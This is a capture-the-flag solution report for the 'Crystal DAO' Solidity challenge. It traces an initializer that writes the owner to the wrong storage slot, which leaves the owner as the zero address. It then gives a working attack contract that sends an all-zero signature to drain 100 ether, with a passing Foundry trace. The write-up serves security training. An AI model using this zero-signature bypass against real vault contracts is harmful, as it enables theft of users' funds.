# Challenge 7: Crystal DAO - Solution Report

## Problem Overview

### Contract Summary

The Crystal DAO challenge involves two main contracts:

1. `FactoryDao`: A factory contract that deploys new `DaoVaultImplementation` contracts using the ERC1167 minimal proxy pattern.

2. `DaoVaultImplementation`: The implementation contract for DAO vaults, which includes:
   - `initialize(address _owner)`: Initializes the vault with an owner.
   - `execWithSignature(...)`: Executes transactions with a valid signature from the owner.
   - `getDomainSeparator()`: Returns the EIP712 domain separator.

The `DaoVaultImplementation` uses EIP712 for typed data signing and implements an upgradeable pattern.

### Initial Setup

- A `FactoryDao` contract is deployed.
- A new vault is created using `factory.newWallet()` with `daoManager` as the intended owner.
- The vault is funded with 100 ether.

### Success Criteria

- The `daoManager`'s balance should be 100 ether after the attack.

## Vulnerability

The primary vulnerability in this challenge lies in the `initialize` function of the `DaoVaultImplementation` contract:

```solidity
function initialize(address _owner) public initializer {
    // EIP712 init: name DaoWallet, version 1.0
    __EIP712_init("DaoWallet", "1.0");

    // postInit: set owner with gas optimizations
    assembly {
        sstore(0, _owner)
    }
}
```

The vulnerability stems from two key issues:

1. Incorrect Storage Slot Usage: The inline assembly code `sstore(0, _owner)` attempts to store the owner address in storage slot 0. However, according to the contract's storage layout, the `owner` variable is actually located in slot 53. This mismatch causes the owner to be set incorrectly.

```
forge inspect DaoVaultImplementation storage-layout --pretty
```

```
| Name           | Type                        | Slot | Offset | Bytes | Contract                                               |
|----------------|-----------------------------|------|--------|-------|--------------------------------------------------------|
| _initialized   | uint8                       | 0    | 0      | 1     | src/7_crystalDAO/crystalDAO.sol:DaoVaultImplementation |
| _initializing  | bool                        | 0    | 1      | 1     | src/7_crystalDAO/crystalDAO.sol:DaoVaultImplementation |
| _hashedName    | bytes32                     | 1    | 0      | 32    | src/7_crystalDAO/crystalDAO.sol:DaoVaultImplementation |
| _hashedVersion | bytes32                     | 2    | 0      | 32    | src/7_crystalDAO/crystalDAO.sol:DaoVaultImplementation |
| _name          | string                      | 3    | 0      | 32    | src/7_crystalDAO/crystalDAO.sol:DaoVaultImplementation |
| _version       | string                      | 4    | 0      | 32    | src/7_crystalDAO/crystalDAO.sol:DaoVaultImplementation |
| __gap          | uint256[48]                 | 5    | 0      | 1536  | src/7_crystalDAO/crystalDAO.sol:DaoVaultImplementation |
| owner          | address                     | 53   | 0      | 20    | src/7_crystalDAO/crystalDAO.sol:DaoVaultImplementation |
| usedSigs       | mapping(bytes32 => bool)    | 54   | 0      | 32    | src/7_crystalDAO/crystalDAO.sol:DaoVaultImplementation |
| nonces         | mapping(address => uint256) | 55   | 0      | 32    | src/7_crystalDAO/crystalDAO.sol:DaoVaultImplementation |
```

2. Storage Collision: Storage slot 0 is already in use by the `Initializable` contract (a base contract of `DaoVaultImplementation`) for its `_initialized` and `_initializing` variables. Writing to this slot may interfere with the initialization mechanism.

As a result of these issues, the `owner` variable is never properly set and remains `address(0)`. This effectively leaves the vault without a valid owner, making it vulnerable to unauthorized access.

## Attack Process

The attack exploits the fact that the vault's owner is incorrectly set to `address(0)`. The process involves the following steps:

1. Deploy Attack Contract:
   Create a contract (`DaoVaultAttack`) that interacts with the vulnerable vault.

2. Prepare Zero Signature:
   Since the owner is `address(0)`, we can bypass the signature check by using a signature that resolves to the zero address. This is achieved by setting:

   - `v = 0`
   - `r = 0`
   - `s = 0`

3. Craft Execution Parameters:
   Prepare the parameters for the `execWithSignature` function:

   - `target`: Set to `daoManager` (the intended recipient of the funds)
   - `amount`: Set to 100 ether (the full balance of the vault)
   - `execOrder`: Empty bytes (as we're performing a simple value transfer)
   - `deadline`: Set to a future timestamp

4. Execute Attack:
   Call the `execWithSignature` function on the vault through the attack contract:

   - The zero signature will pass the ownership check as it resolves to `address(0)`
   - The function will execute the transaction, transferring 100 ether to the `daoManager`

5. Verify Success:
   Check the balance of the `daoManager` to confirm it has received 100 ether

This attack succeeds because the `execWithSignature` function's ownership check compares the recovered signer (which is `address(0)` in this case) with the vault's owner (which is also `address(0)` due to the initialization vulnerability). As a result, the check passes, allowing the attacker to execute arbitrary transactions on behalf of the vault.

## Proof of Concept (PoC)

### Core Implementation

The attack is implemented using a `DaoVaultAttack` contract and modifications to the `testHack` function in the `Challenge7Test` contract.

1. DaoVaultAttack Contract:

```solidity
contract DaoVaultAttack {
    IDaoVault public vault;

    constructor(address _vault) {
        vault = IDaoVault(_vault);
    }

    function attack(address target, uint256 amount) external {
        uint8 v = 0;
        bytes32 r = 0;
        bytes32 s = 0;
        bytes memory execOrder = ""; // Empty bytes for a simple value transfer
        uint256 deadline = block.timestamp + 1 hours;

        vault.execWithSignature(v, r, s, target, amount, execOrder, deadline);
    }

    receive() external payable {}
}
```

This contract encapsulates the attack logic, preparing the zero signature and calling the vulnerable `execWithSignature` function.

2. Modified testHack Function:

```solidity
function testHack() public {
    vm.startPrank(whitehat, whitehat);

    // Deploy the attack contract
    DaoVaultAttack attackContract = new DaoVaultAttack(address(vault));

    // Perform the attack
    attackContract.attack(daoManager, 100 ether);

    vm.stopPrank();

    assertEq(daoManager.balance, 100 ether, "The Dao manager's balance should be 100 ether");
}
```

This function deploys the attack contract and executes the attack, transferring 100 ether to the `daoManager`.

### Running Result

```
Ran 1 test for test/Challenge7.t.sol:Challenge7Test
[PASS] testHack() (gas: 282172)
Traces:
  [282172] Challenge7Test::testHack()
    ├─ [0] VM::startPrank(whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA], whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA])
    │   └─ ← [Return]
    ├─ [140514] → new DaoVaultAttack@0x987B1cb2d9309b71A0390B8e70fA90A865dC4E27
    │   └─ ← [Return] 590 bytes of code
    ├─ [98885] DaoVaultAttack::attack(daoManager: [0x58D433d8b3ebB66937EFDAEA3D9f74247e6D9993], 100000000000000000000 [1e20])
    │   ├─ [95144] 0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3::execWithSignature(0, 0x0000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000000000000000000000000000, daoManager: [0x58D433d8b3ebB66937EFDAEA3D9f74247e6D9993], 100000000000000000000 [1e20], 0x, 3601)
    │   │   ├─ [92433] DaoVaultImplementation::execWithSignature(0, 0x0000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000000000000000000000000000, daoManager: [0x58D433d8b3ebB66937EFDAEA3D9f74247e6D9993], 100000000000000000000 [1e20], 0x, 3601) [delegatecall]
    │   │   │   ├─ [3000] PRECOMPILES::ecrecover(0xd5a61a827bb7fe353fb1afd2b261be9909fb524edc91442a7b5d6c008de0f0b9, 0, 0, 0) [staticcall]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ [0] daoManager::fallback{value: 100000000000000000000}()
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    └─ ← [Stop]
```
